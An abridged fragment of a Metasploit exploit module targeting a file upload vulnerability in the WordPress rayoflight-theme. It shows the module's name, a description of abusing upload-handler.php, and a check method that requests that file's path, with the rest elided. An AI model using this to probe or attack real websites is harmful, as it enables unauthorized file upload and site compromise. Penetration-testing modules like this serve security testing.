...
class Metasploit3 < Msf::Exploit::Remote
    ...
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'WordPress rayoflight-theme Remote File Upload Vulnerability',
            'Description'    => %q{
                    This module exploits a vulnerability found in Wp rayoflight-theme By abusing the upload-handler.php file,
    ...
    def check
        ...
        res = send_request_cgi({
            'method' => 'GET',
            'uri'    => "#{uri}wp-content/themes/rayoflight-theme/functions/upload-handler.php"
        })
